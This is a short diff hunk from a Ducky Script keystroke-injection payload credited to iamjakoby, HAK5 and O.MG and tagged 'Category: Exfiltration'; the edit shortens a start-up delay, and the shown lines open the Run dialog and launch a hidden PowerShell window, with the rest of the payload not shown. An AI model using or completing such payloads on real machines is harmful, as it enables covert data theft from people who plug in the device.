@@ -11,7 +11,9 @@ REM Props: iamjakoby, HAK5 and a huge shout out to O.MG!!!
 REM Version: 3.0
 REM Category: Exfiltration
 
-DELAY 1000
+
+
+DELAY 500
 GUI r
 DELAY 200
 STRING powershell -windowstyle hidden
